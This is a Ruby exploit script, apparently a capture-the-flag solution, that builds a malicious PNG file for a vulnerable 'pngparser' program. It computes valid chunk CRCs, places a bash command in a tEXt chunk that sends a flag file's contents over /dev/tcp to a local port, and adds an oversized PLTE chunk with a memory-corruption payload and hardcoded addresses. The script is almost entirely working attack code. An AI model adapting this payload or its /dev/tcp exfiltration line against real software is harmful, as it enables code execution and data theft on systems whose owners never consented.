#!/usr/bin/env ruby
#encoding: ascii-8bit
require 'pwn'      # https://github.com/peter50216/pwntools-ruby

#================= Exploit Start ====================

magic = "\x89PNG\x0d\x0a\x1a\x0a"
context.endian = 'big'

@crcTable=Array.new(256)
256.times do |n|
  c = n
  8.times do |k|
    if (c&1) == 1
      c = 0xEDB88320^((c>>1)&0x7FFFFFFF);
    else
      c = ((c>>1)&0x7FFFFFFF);
    end
  end
  @crcTable[n] = c;
end
def calc_crc(str)
  c = 0xffffffff
  str.bytes.each do |s|
    c = @crcTable[(c^s) & 255]^((c>>8)&0xFFFFFF)
  end
  c^0xffffffff
end

def ihdr
  size = 13
  data = 'IHDR' + "\x00\x00\x09\xae\x00\x00\x05\x2e\x08\x06\x00\x00\x00"
  size.p32 + data + calc_crc(data).p32
end

def text
  cmd = %q(bash -c "bash -c 'cat Th1s_1s_S3creT_F14g_F0r_YoU' -i >& /dev/tcp/127.0.0.1/12345")
  str = "A" * 78 + "\x00"+"B"*34 + cmd
  size = str.size
#  fail if str.size > 79
  data = 'tEXt' + str
  size.p32 + data + calc_crc(data).p32
end

def time
  size = 7
  str = 1.p16 + 1.p8 * 5
  data = 'tIME' + str
  size.p32 + data + calc_crc(data).p32
end

def chrm
  size = 32
  data = 'cHRM' + 'A' * size
  size.p32 + data + calc_crc(data).p32
end

def plte
  size = 0xd0000002
  data = ''
  context.local(endian: 'little') do
    data = 'PLTE' + ("\x08\x04\xe5"+"A"*(8*4-3) + 0x22.p32 + 0x11.p32 + 0x08048540.p32 + 0.p32*2 + 0xfa39.p32 ).ljust(2000,"\x00") + 0x4ba88955.p32.reverse
  end
  size.p32 + data# + calc_crc(data).p32
end

IO.binwrite('pngparser.png', magic + ihdr + text + chrm + time + plte)
